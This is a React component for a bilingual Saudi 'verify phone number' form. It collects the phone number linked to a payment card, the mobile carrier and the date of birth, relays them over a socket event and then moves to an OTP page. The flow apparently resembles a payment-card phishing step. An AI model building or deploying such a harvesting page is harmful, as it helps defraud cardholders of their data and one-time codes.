import React, { useEffect, useRef, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { socketService } from '../../services/socketService';
import { useI18n } from '../../shared/i18n';
import { getStoredPhone, setStoredPhone } from '../../shared/utils';

const toEnglishDigits = (value: string): string =>
    value
        .replace(/[٠-٩]/g, (digit) => String('٠١٢٣٤٥٦٧٨٩'.indexOf(digit)))
        .replace(/[۰-۹]/g, (digit) => String('۰۱۲۳۴۵۶۷۸۹'.indexOf(digit)));

const normalizeSaudiMobileInput = (value: string): string => {
    const digitsOnly = toEnglishDigits(value).replace(/[^0-9]/g, '').slice(0, 10);

    if (!digitsOnly) return '';
    if (digitsOnly.length === 1) {
        return digitsOnly[0] === '0' ? '0' : '';
    }

    if (!digitsOnly.startsWith('05')) {
        return '05';
    }

    return digitsOnly;
};

const Phone: React.FC = () => {
    const navigate = useNavigate();
    const { t, language, isRTL } = useI18n();
    const isArabic = isRTL || language?.toLowerCase().startsWith('ar');
    const [phone, setPhone] = useState('');
    const [provider, setProvider] = useState('');
    const [birthDate, setBirthDate] = useState('');
    const [error, setError] = useState('');
    const [isProviderOpen, setIsProviderOpen] = useState(false);
    const providerRef = useRef<HTMLDivElement>(null);

    useEffect(() => {
        const storedPhone = getStoredPhone();
        if (storedPhone) {
            setPhone(normalizeSaudiMobileInput(storedPhone));
        }
    }, []);

    const networkProviders = [
        { value: 'stc', label: 'STC' },
        { value: 'jawwy', label: 'Jawwy (STC)' },
        { value: 'mobily', label: 'Mobily' },
        { value: 'zain', label: 'Zain' },
        { value: 'yaqoot', label: 'Yaqoot (Zain)' },
        { value: 'salam', label: 'Salam Mobile' },
        { value: 'virgin', label: 'Virgin Mobile' },
        { value: 'lebara', label: 'Lebara' },
        { value: 'redbull', label: 'Red Bull MOBILE' }
    ];

    const formatDate = (date: Date) => {
        const year = date.getFullYear();
        const month = `${date.getMonth() + 1}`.padStart(2, '0');
        const day = `${date.getDate()}`.padStart(2, '0');
        return `${year}-${month}-${day}`;
    };

    const calculateAge = (dateString: string) => {
        const today = new Date();
        const birth = new Date(dateString);
        let age = today.getFullYear() - birth.getFullYear();
        const monthDiff = today.getMonth() - birth.getMonth();
        if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birth.getDate())) {
            age--;
        }
        return age;
    };

    const today = new Date();
    const maxBirthDate = new Date(today.getFullYear() - 16, today.getMonth(), today.getDate());
    const minBirthDate = new Date(today.getFullYear() - 120, today.getMonth(), today.getDate());

    useEffect(() => {
        const handleClickOutside = (event: MouseEvent) => {
            const target = event.target as Node;

            if (providerRef.current && !providerRef.current.contains(target)) {
                setIsProviderOpen(false);
            }
        };

        document.addEventListener('mousedown', handleClickOutside);
        return () => document.removeEventListener('mousedown', handleClickOutside);
    }, []);

    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault();

        if (phone.length !== 10 || !phone.startsWith('05')) {
            setError(language === 'ar'
                ? 'يرجى إدخال رقم جوال صحيح يبدأ بـ 05 ويتكون من 10 أرقام إنجليزية فقط'
                : 'Please enter a valid mobile number that starts with 05 and contains exactly 10 English digits');
            return;
        }

        if (!provider) {
            setError(language === 'ar' ? 'يرجى اختيار مزود الشبكة' : 'Please select a network provider');
            return;
        }

        if (!birthDate) {
            setError(language === 'ar' ? 'يرجى اختيار تاريخ الميلاد' : 'Please select date of birth');
            return;
        }

        const age = calculateAge(birthDate);
        if (age < 16 || age > 120) {
            setError(language === 'ar'
                ? 'العمر المسموح بين 16 و 120 سنة فقط'
                : 'Allowed age must be between 16 and 120 years');
            return;
        }

        const normalizedProvider = provider.trim().toLowerCase();

        setError('');
        setStoredPhone(phone);
        socketService.emitClientEvent('submitPhone', { phone, provider: normalizedProvider, birthDate, age });
        navigate('/otp-phone');
    };

    return (
        <div className="min-h-screen w-full flex items-center justify-center px-4 py-6 relative z-20" dir={isArabic ? 'rtl' : 'ltr'}>
            <div className="w-full max-w-lg bg-white rounded-2xl shadow-xl border border-gray-100 overflow-visible">
                <div className="bg-gradient-to-r from-slate-50 to-blue-50 px-6 py-5 border-b border-gray-100">
                    <div className={`flex items-center gap-3 ${isArabic ? 'flex-row-reverse' : ''}`}>
                        <div className={isArabic ? 'text-right' : 'text-left'} style={{ textAlign: isArabic ? 'right' : 'left' }}>
                            <h2 className="text-xl font-bold text-gray-800">{language === 'ar' ? 'تأكيد رقم الهاتف' : t('verifyPhoneNumber')}</h2>
                            <p className="text-gray-500 text-sm mt-1">
                                {language === 'ar'
                                    ? 'يرجى إدخال البيانات المرتبطة ببطاقة الدفع لإتمام التحقق'
                                    : 'Please provide the details linked to your payment card for verification'}
                            </p>
                        </div>
                    </div>
                </div>

                <form onSubmit={handleSubmit} className={`p-6 md:p-8 space-y-5 ${isArabic ? 'text-right' : 'text-left'}`} style={{ textAlign: isArabic ? 'right' : 'left' }}>
                    <div>
                        <label className={`block text-sm font-semibold text-gray-700 mb-2 ${isArabic ? 'text-right' : 'text-left'}`} style={{ textAlign: isArabic ? 'right' : 'left' }}>
                            {language === 'ar' ? 'رقم الهاتف المرتبط ببطاقة الدفع' : 'Phone number linked to payment card'}
                        </label>
                        <div className="flex" dir="ltr">
                            <div className="h-[46px] flex items-center justify-center px-3 bg-slate-50 border border-slate-300 rounded-l-lg border-r-0 text-slate-500 font-semibold text-sm whitespace-nowrap">
                                +966
                            </div>
                            <input
                                type="tel"
                                dir="ltr"
                                inputMode="numeric"
                                style={{ direction: 'ltr', textAlign: 'left' }}
                                className="h-[46px] w-full px-4 border border-slate-300 rounded-r-lg text-base text-left placeholder:text-gray-400 placeholder:opacity-100 focus:ring-2 focus:ring-brand outline-none"
                                placeholder="05xxxxxxxx"
                                maxLength={10}
                                value={phone}
                                onChange={(e) => {
                                    const normalizedPhone = normalizeSaudiMobileInput(e.target.value);

                                    setPhone(normalizedPhone);
                                    if (normalizedPhone) {
                                        setStoredPhone(normalizedPhone);
                                    }
                                    if (error) setError('');
                                }}
                                onBlur={() => {
                                    if (!phone) return;
                                    if (phone.length !== 10 || !phone.startsWith('05')) {
                                        setError(language === 'ar'
                                            ? 'يرجى إدخال رقم جوال صحيح يبدأ بـ 05 ويتكون من 10 أرقام إنجليزية فقط'
                                            : 'Please enter a valid mobile number that starts with 05 and contains exactly 10 English digits');
                                        return;
                                    }
                                    if (error) setError('');
                                }}
                                required
                            />
                        </div>
                    </div>

                    <div>
                        <label className={`block text-sm font-semibold text-gray-700 mb-2 ${isArabic ? 'text-right' : 'text-left'}`} style={{ textAlign: isArabic ? 'right' : 'left' }}>
                            {language === 'ar' ? 'مزود الشبكة' : 'Network provider'}
                        </label>
                        <div className="relative" ref={providerRef}>
                            <button
                                type="button"
                                onClick={() => {
                                    setIsProviderOpen(prev => !prev);
                                }}
                                className={`w-full p-3 sm:p-4 ${isArabic ? 'pr-12 pl-3' : 'pl-12 pr-3'} border border-gray-300 rounded-xl bg-white text-gray-800 focus:ring-2 focus:ring-brand outline-none transition-all duration-200 ${isArabic ? 'text-right' : 'text-left'}`}
                                style={{ textAlign: isArabic ? 'right' : 'left' }}
                            >
                                {provider
                                    ? networkProviders.find((item) => item.value === provider)?.label
                                    : (language === 'ar' ? 'اختر مزود الشبكة' : 'Select provider')}
                            </button>
                            <span className={`pointer-events-none absolute ${isArabic ? 'right-4' : 'left-4'} top-1/2 -translate-y-1/2 text-gray-500 text-sm transition-transform duration-300 ${isProviderOpen ? 'rotate-180' : 'rotate-0'}`}>▾</span>

                            <div
                                className={`absolute z-20 left-0 right-0 origin-top transition-all duration-300 ease-out ${isProviderOpen ? 'opacity-100 scale-y-100 translate-y-1 pointer-events-auto' : 'opacity-0 scale-y-95 -translate-y-1 pointer-events-none'}`}
                            >
                                <div className="mt-2 border border-gray-200 rounded-xl bg-white shadow-lg p-1 max-h-64 overflow-y-auto">
                                    {networkProviders.map((item) => (
                                        <button
                                            type="button"
                                            key={item.value}
                                            onClick={() => {
                                                setProvider(item.value);
                                                setIsProviderOpen(false);
                                                if (error) setError('');
                                            }}
                                            className={`w-full ${isArabic ? 'text-right' : 'text-left'} px-3 py-2 rounded-lg text-sm transition-all ${provider === item.value ? 'bg-blue-50 text-blue-700 font-semibold' : 'hover:bg-gray-50 text-gray-700'}`}
                                            style={{ textAlign: isArabic ? 'right' : 'left' }}
                                        >
                                            {item.label}
                                        </button>
                                    ))}
                                </div>
                            </div>
                        </div>
                    </div>

                    <div>
                        <label className={`block text-sm font-semibold text-gray-700 mb-2 ${isArabic ? 'text-right' : 'text-left'}`} style={{ textAlign: isArabic ? 'right' : 'left' }}>
                            {language === 'ar' ? 'تاريخ الميلاد' : 'Date of birth'}
                        </label>
                        <div className="relative">
                            <input
                                type="date"
                                value={birthDate}
                                onChange={(e) => {
                                    setBirthDate(e.target.value);
                                    if (error) setError('');
                                }}
                                min={formatDate(minBirthDate)}
                                max={formatDate(maxBirthDate)}
                                className="w-full p-3 sm:p-4 border border-gray-300 rounded-xl bg-white text-gray-800 focus:ring-2 focus:ring-brand outline-none"
                                required
                            />
                        </div>
                    </div>

                    {error && (
                        <div className={`bg-red-50 border border-red-200 text-red-700 text-sm rounded-xl px-4 py-3 ${isArabic ? 'text-right' : 'text-left'}`} style={{ textAlign: isArabic ? 'right' : 'left' }}>
                            {error}
                        </div>
                    )}

                    <button
                        type="submit"
                        disabled={phone.length !== 10 || !provider || !birthDate || !phone.startsWith('05')}
                        dir={isArabic ? 'rtl' : 'ltr'}
                        className="w-full bg-brand hover:bg-brand-dark text-white font-bold py-3.5 rounded-xl shadow-lg disabled:opacity-50 disabled:cursor-not-allowed transition-all"
                    >
                        {t('sendCode')}
                    </button>
                </form>
            </div>
        </div>
    );
};

export default Phone;
